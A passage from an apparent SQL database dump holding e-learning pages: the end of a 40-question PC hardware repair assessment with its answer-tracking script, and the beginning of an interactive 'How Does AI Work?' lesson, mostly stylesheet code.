motherboard, identify the northbridge and southbridge chips.\r\n• What are their primary functions (memory, PCIe, legacy I/O) and how do they communicate?\r\n• Why do these chips often have heatsinks, and what happens if the northbridge overheats?\r\n• Compare with a modern platform (CPU integrated memory controller) – what changed?`,\r\n\r\n            `10. DETAILED – New GPU, no display.\r\nAfter installing a brand new graphics card and connecting the PCIe power cables, the system turns on but the monitor (connected to GPU) says "no signal".\r\n• List three immediate checks: power cables, monitor input, card seating.\r\n• If the system has integrated graphics, how would you force the BIOS to use the discrete GPU?\r\n• Describe how to test the card in another PCIe slot or another computer to isolate the fault.`,\r\n\r\n            // === MODULE 2 (11–20) – Configure hardware and software ===\r\n            `11. DETAILED – Windows Setup can''t find drives.\r\nDuring a clean Windows 11 installation, the drive list is empty. The storage device is an NVMe SSD. BIOS SATA mode is set to "RAID".\r\n• What setting should be changed to "AHCI" and why does Windows Setup lack drivers in RAID mode?\r\n• If the drive still doesn''t appear, what two other BIOS features (CSM, secure boot) might affect visibility?\r\n• Explain how to load a third-party NVMe driver during installation via USB.`,\r\n\r\n            `12. DETAILED – Dual-boot Ubuntu alongside Windows.\r\nA user wants to install Ubuntu Linux while keeping Windows 10 on a single 512GB SSD.\r\n• Describe the partition scheme: shrink Windows volume, create ext4 and swap partitions.\r\n• Explain the role of the GRUB bootloader and how it handles dual boot.\r\n• What UEFI settings (secure boot, fast boot) may need adjustment for Linux to boot?`,\r\n\r\n            `13. DETAILED – Printer prints garbled text.\r\nA USB-connected laser printer outputs pages of random symbols instead of the test page.\r\n• Is this a hardware (printer logic) or software (driver) issue? How to verify by printing from BIOS/diagnostics?\r\n• Walk through driver reinstallation: remove device, delete driver, install correct version.\r\n• If the issue persists, how would you check the printer''s internal self-test print and emulation mode (PCL vs PostScript)?`,\r\n\r\n            `14. DETAILED – Secure boot blocks older Linux USB.\r\nYou enable Secure Boot in UEFI, and now a Ubuntu 18.04 live USB fails to boot with a "security violation" message.\r\n• Explain why older Linux kernels may not support Secure Boot.\r\n• Two solutions: disable Secure Boot temporarily, or enable "Microsoft third-party UEFI CA" and use signed bootloaders.\r\n• What are the security trade-offs of disabling Secure Boot?`,\r\n\r\n            `15. DETAILED – Black screen with blinking cursor.\r\nAfter a power outage, a Windows PC boots to a black screen and a blinking top-left cursor.\r\n• List two possible causes: corrupted bootloader or incorrect boot device order.\r\n• Describe how to use Windows recovery media to run bootrec commands (fixmbr, fixboot, rebuildbcd).\r\n• How would you check if the wrong drive is set as first boot in BIOS?`,\r\n\r\n            `16. DETAILED – Static IP configuration (Windows).\r\nA small office requires a static IP address for a file server (Windows 11).\r\n• Walk through the full steps: Control Panel > Network adapter > IPv4 properties.\r\n• What values must be entered: IP address, subnet mask, default gateway, DNS servers.\r\n• Explain how to verify connectivity with ping, ipconfig, and why setting a static IP may require reserving the address in the router.`,\r\n\r\n            `17. DETAILED – Network driver rollback.\r\nAfter updating the ethernet driver via Windows Update, the PC loses all network connectivity.\r\n• How to boot into Safe Mode with Networking and use Device Manager to roll back the driver?\r\n• If rollback is greyed out, describe the process to download the correct driver from another computer and install manually.\r\n• How to use System Restore if driver rollback fails?`,\r\n\r\n            `18. DETAILED – Slow Wi-Fi on one laptop.\r\nA laptop shows strong Wi-Fi signal but internet speed is below 10 Mbps, while other devices get 100 Mbps.\r\n• Investigate hardware: possible antenna loose, Wi-Fi card generation (2.4GHz vs 5GHz) or driver power saving.\r\n• Describe checking wireless adapter settings: band preference, channel width, roaming aggressiveness.\r\n• If the card supports it, how to verify it''s connecting at the correct link speed (control panel > status)?`,\r\n\r\n            `19. DETAILED – RAM running below rated speed.\r\nIn UEFI, you notice that 32GB DDR4 is running at 2133MHz, but the kit is rated for 3200MHz.\r\n• What is XMP/DOCP and how do you enable it to reach rated speeds?\r\n• After enabling XMP, the system fails to boot. What troubleshooting steps (clear CMOS, manual voltage/timings) would you take?\r\n• Explain why some motherboards limit speed with more than two RAM sticks.`,\r\n\r\n            `20. DETAILED – Check if TRIM is enabled for SSD.\r\nOn a Windows 10 PC with an SSD, why is TRIM important for long-term performance?\r\n• Write the exact command to check TRIM status using fsutil in an admin command prompt.\r\n• If TRIM is disabled, how to enable it, and what disk health tools can confirm TRIM is working?`,\r\n\r\n            // === MODULE 3 (21–30) – Perform assembly and disassembly ===\r\n            `21. DETAILED – CPU cooler installation / thermal paste.\r\nYou are assembling a PC with an aftermarket air cooler.\r\n• Describe the two most common methods for applying thermal paste (pea-size, spread) and which is preferred.\r\n• What mistake could cause air bubbles or insufficient coverage, and how to avoid overtightening the cooler?\r\n• After installation, how do you verify proper contact and temperature?`,\r\n\r\n            `22. DETAILED – Power button does nothing.\r\nAfter assembling a new build, pressing the case power button yields no fans, no LEDs.\r\n• Outline a step-by-step checklist: PSU switch, wall power, front panel header orientation, PSU jumper test.\r\n• How to "jump start" the motherboard with a screwdriver to isolate a faulty case switch?\r\n• If the PSU fan spins when jumped, but not when connected, what might be shorting (standoffs, loose screws)?`,\r\n\r\n            `23. DETAILED – Upgrade documentation.\r\nA client requests an SSD and RAM upgrade. You must document before and after.\r\n• What five details should be recorded: serial numbers, old component specs, new component specs, photos of connections, post-upgrade benchmark?\r\n• Explain why documenting cable routing and screw locations is critical for reassembly.\r\n• Provide a template for a simple upgrade report.`,\r\n\r\n            `24. DETAILED – Stripped standoff screw.\r\nWhile removing a motherboard, a standoff screw head strips and cannot be turned with a screwdriver.\r\n• What tools could help: rubber band method, locking pliers, or a screw extractor kit?\r\n• How to avoid damaging motherboard traces while extracting?\r\n• If the standoff spins freely but the screw is stuck, how do you separate the board?`,\r\n\r\n            `25. DETAILED – Modular PSU cable warning.\r\nYou are replacing an old power supply with a new modular unit. The old cables look identical.\r\n• Why is it dangerous to reuse modular cables from a different PSU (pinout variations)?\r\n• Explain how to confirm compatibility: manufacturer documentation, part numbers, or visual pinout checks.\r\n• What damage could occur if mismatched cables are used (burned SSD, fried motherboard)?`,\r\n\r\n            `26. DETAILED – Bent socket pins.\r\nWhile installing a CPU, you accidentally bend several pins in an LGA socket.\r\n• What magnification tools help inspect the damage, and can bent pins be straightened with a mechanical pencil?\r\n• Describe the delicate process of aligning pins with a razor blade under magnification.\r\n• If pins break off, what are the options (replacement socket, motherboard replacement)?`,\r\n\r\n            `27. DETAILED – Quality checks after assembly.\r\nAfter completing an assembly, list three tests you perform before closing the case.\r\n• Test 1: POST and boot into BIOS – verify CPU/RAM detection, temperatures.\r\n• Test 2: Boot from installation media to confirm storage and peripheral function.\r\n• Test 3: Run a stress test (like Cinebench) for 5 minutes while monitoring voltages and fan operation.\r\n• Why is it important to check all USB ports and audio jacks?`,\r\n\r\n            `28. DETAILED – HDD to SSD migration (OS and data).\r\nA client wants to migrate their 1TB HDD (with Windows and files) to a new 500GB SSD.\r\n• Since the SSD is smaller, what must be done first (disk cleanup, move personal files)?\r\n• Describe two cloning methods: using manufacturer software (Samsung Magician) or a bootable tool like Clonezilla.\r\n• After cloning, explain how to change boot order and verify the SSD is the boot drive.`,\r\n\r\n            `29. DETAILED – Assembly report essentials.\r\nFor a training record, you must document an assembly from scratch.\r\n• What five key details must be included: component list with serial numbers, torque settings for cooler, cable management photos, POST screen photo, and any unexpected issues.\r\n• Why is it important to note the BIOS version and settings?\r\n• How to write a concise but thorough conclusion about system stability?`,\r\n\r\n            `30. DETAILED – RAM only half recognized.\r\nAfter installing two 16GB sticks, the system reports only 16GB total.\r\n• List likely causes: one stick not seated, faulty slot, CPU cooler too tight causing memory controller pressure.\r\n• How to test each stick individually in each slot to isolate the fault.\r\n• If the board supports dual-rank, but one stick is single-rank, could that cause detection issues?`,\r\n\r\n            // === MODULE 4 (31–40) – Troubleshoot and repair ===\r\n            `31. DETAILED – Random shutdowns (overheating suspicion).\r\nA computer shuts down after 15–20 minutes of gaming. You suspect overheating.\r\n• Describe how to monitor CPU and GPU temperatures using HWMonitor or BIOS.\r\n• If temperatures exceed 90°C, what physical checks should you perform (heatsink mounting, fan operation, thermal paste)?\r\n• What other component (PSU, VRM) could cause thermal shutdown?`,\r\n\r\n            `32. DETAILED – Clicking hard drive – S.M.A.R.T. diagnosis.\r\nYou hear clicking sounds from a 3.5" HDD, and the system is sluggish.\r\n• How to use CrystalDiskInfo or smartctl to read S.M.A.R.T. attributes: reallocated sectors, spin-up time.\r\n• What do raw values of "current pending sector" indicate?\r\n• Explain immediate backup steps and why continued use risks total failure.`,\r\n\r\n            `33. DETAILED – Blue screen IRQL_NOT_LESS_OR_EQUAL.\r\nA PC crashes with this stop code shortly after boot.\r\n• How to locate the minidump file in C:\\Windows\\Minidump and analyze it with BlueScreenView.\r\n• What common causes: faulty driver, bad RAM, or corrupted system file?\r\n• Walk through driver rollback, memory diagnostics (Windows Memory Diagnostic), and system file checker.`,\r\n\r\n            `34. DETAILED – Testing ATX power supply with multimeter.\r\nYou are testing a 24-pin ATX connector. Identify which pins to short (PS_ON# to COM) to start the PSU.\r\n• Which pins provide +3.3V, +5V, +12V, and -12V, and what are acceptable tolerances?\r\n• Describe safety: never short the PS_ON# to any pin other than ground, and avoid touching bare probes.`,\r\n\r\n            `35. DETAILED – CPU fan not spinning after repair.\r\nAfter reassembling a PC, the CPU fan is stuck (0 RPM) while the system runs.\r\n• Immediate action: shut down to prevent overheating.\r\n• Troubleshoot: fan header connection, BIOS fan control settings, or faulty fan.\r\n• What preventive maintenance (cleaning dust, lubricating bearings) could avoid future fan issues?`,\r\n\r\n            `36. DETAILED – No POST, no speaker, no beeps.\r\nA computer turns on (fans spin, LEDs on) but no video, and the motherboard lacks an internal speaker.\r\n• How can you troubleshoot without beep codes? Use a multimeter to check voltages on the board.\r\n• Install a diagnostic POST card (PCIe or USB) to read hex codes.\r\n• List steps: reseat CPU, RAM, GPU, clear CMOS, minimal boot (only CPU + one RAM).`,\r\n\r\n            `37. DETAILED – Six-month preventive maintenance schedule.\r\nYou are training a junior tech on PM tasks. List three essential tasks for a 6-month cleaning.\r\n• 1. Internal dust removal using compressed air – emphasis on PSU intake, heatsinks, fans.\r\n• 2. Check and reseat cables, expansion cards, and RAM (if corrosion is suspected).\r\n• 3. Thermal paste replacement if CPU temperatures have risen >5°C over baseline.\r\n• Why should you also verify battery (CMOS) voltage and backup important data?`,\r\n\r\n            `38. DETAILED – Intermittent freezing during gaming.\r\nA PC runs stable in office apps but freezes for 2 seconds during gaming.\r\n• Isolation steps: monitor GPU/CPU usage, check event viewer for errors.\r\n• Could be PSU unable to handle transient spikes – how to test with a known-good PSU?\r\n• Run FurMark and Prime95 simultaneously to stress the system while measuring voltages.`,\r\n\r\n            `39. DETAILED – Ethernet dead after motherboard replacement.\r\nAfter installing a new motherboard, integrated ethernet doesn''t work. Driver is correctly installed, link light off.\r\n• What BIOS setting could disable the LAN controller (Onboard LAN, LAN boot ROM)?\r\n• Check if the port is damaged – inspect for bent pins inside RJ45.\r\n• Could a static IP misconfiguration cause the "unidentified network" status?`,\r\n\r\n            `40. DETAILED – Noisy PC, fan bearing diagnosis.\r\nA client complains of a loud grinding noise that changes with fan speed.\r\n• How to temporarily stop each fan (with a plastic probe) to isolate the noisy one.\r\n• If it''s a case fan, can you oil the bearing (sleeve vs ball bearing)?\r\n• When should the fan be replaced, and what safety checks ensure the PC stays cool during repair?`\r\n        ];\r\n\r\n        // ----- state -----\r\n        let currentIndex = 0;                // 0-based question index (0..39)\r\n        let answers = new Array(40).fill('''');\r\n        const nameInput = document.getElementById(''fullName'');\r\n        const admInput = document.getElementById(''admissionNo'');\r\n        const nextBtn = document.getElementById(''nextQuestionBtn'');\r\n        const finalBtn = document.getElementById(''finalSubmitBtn'');\r\n        const activeAnswer = document.getElementById(''activeAnswer'');\r\n        const activeCounter = document.getElementById(''activeCounter'');\r\n        const scenarioText = document.getElementById(''scenarioText'');\r\n        const moduleIndicator = document.getElementById(''moduleIndicator'');\r\n        const currentQDisplay = document.getElementById(''currentQDisplay'');\r\n        const answeredSpan = document.getElementById(''answeredCount'');\r\n        const dynamicAlert = document.getElementById(''dynamicAlert'');\r\n\r\n        // helper\r\n        function countAnswered() {\r\n            return answers.filter(a => a.trim() !== '''').length;\r\n        }\r\n\r\n        function updateModuleIndicator() {\r\n            let mod = Math.floor(currentIndex / 10) + 1;\r\n            moduleIndicator.innerText = `MODULE ${mod} · QUESTION ${currentIndex+1}/40`;\r\n        }\r\n\r\n        function refreshCounterAndSave() {\r\n            // save current answer from input to answers array\r\n            if (activeAnswer) {\r\n                answers[currentIndex] = activeAnswer.value;\r\n                activeCounter.innerText = activeAnswer.value.length + '' characters'';\r\n            }\r\n        }\r\n\r\n        function loadQuestion(index) {\r\n            // save previous before loading new\r\n            if (activeAnswer) {\r\n                answers[currentIndex] = activeAnswer.value;\r\n            }\r\n            currentIndex = index;\r\n            // update text\r\n            scenarioText.innerText = scenarios[currentIndex];\r\n            activeAnswer.value = answers[currentIndex] || '''';\r\n            activeCounter.innerText = (answers[currentIndex] || '''').length + '' characters'';\r\n            updateModuleIndicator();\r\n            // update next button enable/disable: only if current has answer? next always active but we may change style\r\n            // we allow moving even without answering? better to require answer: next enabled only if current is non-empty?  but requirement says after learner attempts all questions? we enforce that next button works only when current is answered.\r\n            // also progress\r\n            refreshUiAll();\r\n        }\r\n\r\n        function refreshUiAll() {\r\n            // total answered count\r\n            let totalAnswered = countAnswered();\r\n            answeredSpan.innerText = totalAnswered;\r\n\r\n            // next button enable/disable: only enabled if current question has a non-empty answer\r\n            if (answers[currentIndex].trim() !== '''') {\r\n                nextBtn.classList.remove(''disabled'');\r\n            } else {\r\n                nextBtn.classList.add(''disabled'');\r\n            }\r\n\r\n            // final button logic: all 40 answered + name/adm\r\n            const nameOk = nameInput.value.trim() !== '''';\r\n            const admOk = admInput.value.trim() !== '''';\r\n            const allAnswered = totalAnswered === 40;\r\n            if (allAnswered && nameOk && admOk) {\r\n                finalBtn.disabled = false;\r\n                finalBtn.classList.add(''active'');\r\n                dynamicAlert.innerText = ''✅ ALL 40 COMPLETE! You may submit.'';\r\n                dynamicAlert.style.background = ''#d2eed2'';\r\n            } else {\r\n                finalBtn.disabled = true;\r\n                finalBtn.classList.remove(''active'');\r\n                let missing = [];\r\n                if (!nameOk) missing.push(''name'');\r\n                if (!admOk) missing.push(''admission'');\r\n                if (!allAnswered) missing.push(`${40-totalAnswered} unanswered`);\r\n                dynamicAlert.innerText = `⚠️ Missing: ${missing.join('', '')}.`;\r\n                dynamicAlert.style.background = ''#fff1cf'';\r\n            }\r\n\r\n            // also update current question display\r\n            currentQDisplay.innerText = `Q${currentIndex+1}`;\r\n        }\r\n\r\n        // next button handler\r\n        nextBtn.addEventListener(''click'', () => {\r\n            // ensure current question answered before moving\r\n            if (answers[currentIndex].trim() === '''') {\r\n                alert(''Please answer the current question before proceeding.'');\r\n                return;\r\n            }\r\n            // move to next question (wrap? but we have only 40, at the end do nothing)\r\n            if (currentIndex < 39) {\r\n                loadQuestion(currentIndex + 1);\r\n            } else {\r\n                // already at last question, maybe disable next but we keep it with disabled style\r\n                // if current answered but it''s last, still move? maybe just stay and show message\r\n                alert(''You are already at the last question (40).'');\r\n            }\r\n        });\r\n\r\n        // input event\r\n        activeAnswer.addEventListener(''input'', () => {\r\n            answers[currentIndex] = activeAnswer.value;\r\n            activeCounter.innerText = activeAnswer.value.length + '' characters'';\r\n            refreshUiAll();   // updates next button enable/disable based on current answer\r\n        });\r\n\r\n        // name/admission listeners\r\n        nameInput.addEventListener(''input'', refreshUiAll);\r\n        admInput.addEventListener(''input'', refreshUiAll);\r\n\r\n        // final submit\r\n        finalBtn.addEventListener(''click'', () => {\r\n            if (countAnswered() !== 40 || !nameInput.value.trim() || !admInput.value.trim()) {\r\n                alert(''You must answer all 40 questions and provide name/admission.'');\r\n                refreshUiAll();\r\n                return;\r\n            }\r\n            let summary = `===== DETAILED REPAIR SUBMISSION =====\\nNAME: ${nameInput.value.trim()}\\nADM: ${admInput.value.trim()}\\n\\nANSWERS:\\n`;\r\n            for (let i=0; i<40; i++) {\r\n                summary += `\\n[${i+1}] ${answers[i]}`;\r\n            }\r\n            console.log(summary);\r\n            alert(''Submission complete. (check console for full log)'');\r\n        });\r\n\r\n        // initial load\r\n        loadQuestion(0);\r\n        refreshUiAll();\r\n    })();\r\n</script>\r\n</body>\r\n</html>', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 0, 'Published', 82, '2026-03-08 15:18:17', '2026-03-08 15:18:17', NULL, NULL),
(16, 7, NULL, 'Module2 Interactive Lesson', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Module 2: How Does AI Work? — M.T.T.I Interactive Lesson</title>\n<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">\n<style>\n  :root {\n    --bg: #0a0e1a;\n    --surface: #111827;\n    --surface2: #1a2235;\n    --border: #1f2e4a;\n    --accent: #00d4ff;\n    --accent2: #7c3aed;\n    --accent3: #10b981;\n    --warn: #f59e0b;\n    --danger: #ef4444;\n    --text: #e2e8f0;\n    --text2: #94a3b8;\n    --text3: #64748b;\n    --glow: rgba(0,212,255,0.15);\n  }\n\n  * { margin:0; padding:0; box-sizing:border-box; }\n\n  body {\n    font-family: ''DM Sans'', sans-serif;\n    background: var(--bg);\n    color: var(--text);\n    min-height: 100vh;\n    overflow-x: hidden;\n  }\n\n  /* Grid background */\n  body::before {\n    content:'''';\n    position:fixed;\n    inset:0;\n    background-image:\n      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),\n      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);\n    background-size: 40px 40px;\n    pointer-events:none;\n    z-index:0;\n  }\n\n  #app { position:relative; z-index:1; }\n\n  /* ===== SCREENS ===== */\n  .screen { display:none; min-height:100vh; }\n  .screen.active { display:flex; flex-direction:column; }\n\n  /* ===== SPLASH ===== */\n  #splash {\n    align-items:center;\n    justify-content:center;\n    text-align:center;\n    padding:40px 20px;\n    background: radial-gradient(ellipse 80% 60% at 50% 40%, rgba(124,58,237,0.12) 0%, transparent 70%);\n  }\n\n  .institute-badge {\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:3px;\n    color:var(--accent);\n    text-transform:uppercase;\n    border:1px solid var(--accent);\n    padding:6px 16px;\n    border-radius:2px;\n    margin-bottom:32px;\n    display:inline-block;\n    animation: pulse 2s ease-in-out infinite;\n  }\n\n  @keyframes pulse {\n    0%,100%{box-shadow:0 0 8px var(--glow);}\n    50%{box-shadow:0 0 24px rgba(0,212,255,0.3);}\n  }\n\n  .splash-title {\n    font-family:''Space Mono'', monospace;\n    font-size:clamp(28px,5vw,52px);\n    font-weight:700;\n    line-height:1.1;\n    margin-bottom:12px;\n    background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--accent2) 100%);\n    -webkit-background-clip:text;\n    -webkit-text-fill-color:transparent;\n  }\n\n  .splash-sub {\n    font-size:16px;\n    color:var(--text2);\n    margin-bottom:8px;\n    font-weight:300;\n  }\n\n  .splash-module {\n    font-size:13px;\n    color:var(--accent);\n    font-family:''Space Mono'', monospace;\n    letter-spacing:1px;\n    margin-bottom:48px;\n  }\n\n  .splash-features {\n    display:flex;\n    gap:16px;\n    justify-content:center;\n    flex-wrap:wrap;\n    margin-bottom:48px;\n  }\n\n  .feature-tag {\n    background:var(--surface2);\n    border:1px solid var(--border);\n    border-radius:20px;\n    padding:8px 16px;\n    font-size:13px;\n    color:var(--text2);\n    display:flex;\n    align-items:center;\n    gap:6px;\n  }\n\n  .feature-tag span { color:var(--accent); }\n\n  .btn-start {\n    background: linear-gradient(135deg, var(--accent2), var(--accent));\n    border:none;\n    color:white;\n    font-family:''DM Sans'', sans-serif;\n    font-size:16px;\n    font-weight:600;\n    padding:16px 48px;\n    border-radius:4px;\n    cursor:pointer;\n    letter-spacing:1px;\n    transition:all 0.3s;\n    position:relative;\n    overflow:hidden;\n  }\n\n  .btn-start::after {\n    content:'''';\n    position:absolute;\n    inset:0;\n    background:white;\n    opacity:0;\n    transition:opacity 0.2s;\n  }\n\n  .btn-start:hover::after { opacity:0.1; }\n  .btn-start:hover { transform:translateY(-2px); box-shadow:0 8px 32px rgba(0,212,255,0.3); }\n\n  /* ===== LESSON SCREEN ===== */\n  #lesson { flex-direction:column; }\n\n  .lesson-header {\n    background:var(--surface);\n    border-bottom:1px solid var(--border);\n    padding:0 24px;\n    display:flex;\n    align-items:center;\n    justify-content:space-between;\n    height:60px;\n    position:sticky;\n    top:0;\n    z-index:100;\n  }\n\n  .lesson-logo {\n    font-family:''Space Mono'', monospace;\n    font-size:13px;\n    color:var(--accent);\n    letter-spacing:2px;\n  }\n\n  .progress-track {\n    flex:1;\n    max-width:400px;\n    margin:0 24px;\n  }\n\n  .progress-label {\n    font-size:11px;\n    color:var(--text3);\n    margin-bottom:6px;\n    font-family:''Space Mono'', monospace;\n    letter-spacing:1px;\n  }\n\n  .progress-bar {\n    height:4px;\n    background:var(--border);\n    border-radius:2px;\n    overflow:hidden;\n  }\n\n  .progress-fill {\n    height:100%;\n    background: linear-gradient(90deg, var(--accent2), var(--accent));\n    border-radius:2px;\n    transition:width 0.5s ease;\n    width:0%;\n  }\n\n  .nav-buttons {\n    display:flex;\n    gap:8px;\n  }\n\n  .btn-nav {\n    background:var(--surface2);\n    border:1px solid var(--border);\n    color:var(--text2);\n    padding:8px 16px;\n    border-radius:3px;\n    cursor:pointer;\n    font-family:''DM Sans'', sans-serif;\n    font-size:13px;\n    transition:all 0.2s;\n    display:flex;\n    align-items:center;\n    gap:6px;\n  }\n\n  .btn-nav:hover { border-color:var(--accent); color:var(--accent); }\n  .btn-nav:disabled { opacity:0.3; cursor:not-allowed; }\n\n  /* Narration bar */\n  .narration-bar {\n    background: linear-gradient(90deg, var(--surface2), var(--surface));\n    border-bottom:1px solid var(--border);\n    padding:12px 24px;\n    display:flex;\n    align-items:center;\n    gap:12px;\n  }\n\n  .narration-icon {\n    width:36px;\n    height:36px;\n    border-radius:50%;\n    background: linear-gradient(135deg, var(--accent2), var(--accent));\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    flex-shrink:0;\n    font-size:16px;\n    cursor:pointer;\n    transition:transform 0.2s;\n  }\n\n  .narration-icon:hover { transform:scale(1.1); }\n\n  .narration-text {\n    font-size:14px;\n    color:var(--text2);\n    line-height:1.5;\n    flex:1;\n  }\n\n  .narration-text .speaking-word {\n    color:var(--accent);\n    background:rgba(0,212,255,0.1);\n    border-radius:2px;\n    padding:0 2px;\n    transition:all 0.1s;\n  }\n\n  .btn-speak {\n    background:transparent;\n    border:1px solid var(--border);\n    color:var(--text2);\n    padding:6px 14px;\n    border-radius:3px;\n    cursor:pointer;\n    font-size:12px;\n    font-family:''Space Mono'', monospace;\n    transition:all 0.2s;\n    white-space:nowrap;\n  }\n\n  .btn-speak:hover { border-color:var(--accent); color:var(--accent); }\n  .btn-speak.speaking { border-color:var(--accent); color:var(--accent); background:var(--glow); }\n\n  /* ===== SLIDE CONTENT ===== */\n  .slide-container {\n    flex:1;\n    padding:40px 24px;\n    max-width:900px;\n    margin:0 auto;\n    width:100%;\n  }\n\n  .slide { display:none; animation:fadeSlide 0.4s ease; }\n  .slide.active { display:block; }\n\n  @keyframes fadeSlide {\n    from { opacity:0; transform:translateY(16px); }\n    to { opacity:1; transform:translateY(0); }\n  }\n\n  .slide-tag {\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:2px;\n    color:var(--accent);\n    text-transform:uppercase;\n    margin-bottom:12px;\n  }\n\n  .slide-title {\n    font-size:clamp(22px,3vw,36px);\n    font-weight:600;\n    line-height:1.2;\n    margin-bottom:24px;\n    color:var(--text);\n  }\n\n  .slide-title em {\n    font-style:normal;\n    background:linear-gradient(90deg, var(--accent), var(--accent2));\n    -webkit-background-clip:text;\n    -webkit-text-fill-color:transparent;\n  }\n\n  .content-block {\n    background:var(--surface);\n    border:1px solid var(--border);\n    border-radius:8px;\n    padding:24px;\n    margin-bottom:20px;\n    position:relative;\n    overflow:hidden;\n  }\n\n  .content-block::before {\n    content:'''';\n    position:absolute;\n    left:0; top:0; bottom:0;\n    width:3px;\n    background:linear-gradient(180deg, var(--accent), var(--accent2));\n  }\n\n  .content-block h3 {\n    font-size:16px;\n    font-weight:600;\n    color:var(--accent);\n    margin-bottom:12px;\n    font-family:''Space Mono'', monospace;\n    letter-spacing:1px;\n  }\n\n  .content-block p {\n    color:var(--text2);\n    line-height:1.7;\n    font-size:15px;\n    margin-bottom:12px;\n  }\n\n  .content-block p:last-child { margin-bottom:0; }\n\n  /* Pipeline visual */\n  .pipeline {\n    display:flex;\n    flex-wrap:wrap;\n    gap:8px;\n    margin-top:16px;\n  }\n\n  .pipeline-step {\n    background:var(--surface2);\n    border:1px solid var(--border);\n    border-radius:6px;\n    padding:12px 16px;\n    display:flex;\n    align-items:center;\n    gap:10px;\n    flex:1;\n    min-width:140px;\n    transition:all 0.3s;\n    cursor:default;\n  }\n\n  .pipeline-step:hover {\n    border-color:var(--accent);\n    background:rgba(0,212,255,0.05);\n    transform:translateY(-2px);\n  }\n\n  .step-num {\n    width:28px;\n    height:28px;\n    border-radius:50%;\n    background:linear-gradient(135deg, var(--accent2), var(--accent));\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    font-family:''Space Mono'', monospace;\n    font-size:12px;\n    font-weight:700;\n    flex-shrink:0;\n  }\n\n  .step-text { font-size:13px; color:var(--text2); line-height:1.3; }\n  .step-text strong { color:var(--text); display:block; font-size:14px; }\n\n  /* Learning types cards */\n  .learning-cards {\n    display:grid;\n    grid-template-columns:repeat(auto-fit, minmax(240px, 1fr));\n    gap:16px;\n    margin-top:8px;\n  }\n\n  .learning-card {\n    background:var(--surface2);\n    border:1px solid var(--border);\n    border-radius:8px;\n    padding:20px;\n    transition:all 0.3s;\n    cursor:default;\n  }\n\n  .learning-card:hover {\n    transform:translateY(-4px);\n    box-shadow:0 8px 32px rgba(0,0,0,0.3);\n  }\n\n  .learning-card.supervised { border-top:3px solid var(--accent); }\n  .learning-card.unsupervised { border-top:3px solid var(--accent2); }\n  .learning-card.reinforcement { border-top:3px solid var(--accent3); }\n\n  .card-icon { font-size:28px; margin-bottom:12px; }\n\n  .card-title {\n    font-family:''Space Mono'', monospace;\n    font-size:13px;\n    font-weight:700;\n    margin-bottom:8px;\n    letter-spacing:1px;\n  }\n\n  .supervised .card-title { color:var(--accent); }\n  .unsupervised .card-title { color:var(--accent2); }\n  .reinforcement .card-title { color:var(--accent3); }\n\n  .card-desc {\n    font-size:13px;\n    color:var(--text2);\n    line-height:1.6;\n    margin-bottom:12px;\n  }\n\n  .card-example {\n    background:var(--bg);\n    border-radius:4px;\n    padding:8px 12px;\n    font-size:12px;\n    color:var(--text3);\n    border-left:2px solid var(--border);\n  }\n\n  /* Neural network visual */\n  .nn-visual {\n    display:flex;\n    gap:0;\n    justify-content:center;\n    align-items:center;\n    padding:24px;\n    background:var(--bg);\n    border-radius:8px;\n    margin-top:16px;\n    overflow-x:auto;\n  }\n\n  .nn-layer {\n    display:flex;\n    flex-direction:column;\n    align-items:center;\n    gap:12px;\n  }\n\n  .nn-label {\n    font-size:11px;\n    font-family:''Space Mono'', monospace;\n    letter-spacing:1px;\n    margin-bottom:8px;\n    text-align:center;\n  }\n\n  .nn-node {\n    width:36px;\n    height:36px;\n    border-radius:50%;\n    border:2px solid;\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    font-size:10px;\n    transition:all 0.3s;\n    animation:nodeGlow 3s ease-in-out infinite;\n  }\n\n  .nn-node.input { border-color:var(--accent); color:var(--accent); }\n  .nn-node.hidden { border-color:var(--accent2); color:var(--accent2); animation-delay:0.5s; }\n  .nn-node.hidden2 { border-color:var(--accent3); color:var(--accent3); animation-delay:1s; }\n  .nn-node.output { border-color:var(--warn); color:var(--warn); animation-delay:1.5s; }\n\n  @keyframes nodeGlow {\n    0%,100%{ box-shadow:none; }\n    50%{ box-shadow:0 0 12px currentColor; }\n  }\n\n  .nn-connector {\n    width:40px;\n    height:2px;\n    background:linear-gradient(90deg, var(--border), var(--accent2), var(--border));\n    opacity:0.5;\n    margin-top:60px;\n    flex-shrink:0;\n  }\n\n  /* Data table */\n  .data-table {\n    width:100%;\n    border-collapse:collapse;\n    font-size:14px;\n    margin-top:16px;\n  }\n\n  .data-table th {\n    background:var(--surface2);\n    color:var(--accent);\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:1px;\n    padding:12px 16px;\n    text-align:left;\n    border-bottom:2px solid var(--border);\n  }\n\n  .data-table td {\n    padding:12px 16px;\n    border-bottom:1px solid var(--border);\n    color:var(--text2);\n    vertical-align:top;\n    line-height:1.5;\n  }\n\n  .data-table tr:hover td { background:rgba(0,212,255,0.03); }\n\n  /* Scenario box */\n  .scenario-box {\n    background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(0,212,255,0.05));\n    border:1px solid var(--accent2);\n    border-radius:8px;\n    padding:24px;\n    margin-bottom:20px;\n    position:relative;\n  }\n\n  .scenario-label {\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:2px;\n    color:var(--accent2);\n    margin-bottom:8px;\n  }\n\n  .scenario-title {\n    font-size:18px;\n    font-weight:600;\n    color:var(--text);\n    margin-bottom:12px;\n  }\n\n  .scenario-text {\n    font-size:14px;\n    color:var(--text2);\n    line-height:1.7;\n  }\n\n  /* ===== QUIZ SCREEN ===== */\n  #quiz {\n    background: radial-gradient(ellipse 80% 60% at 50% 20%, rgba(124,58,237,0.1) 0%, transparent 60%);\n  }\n\n  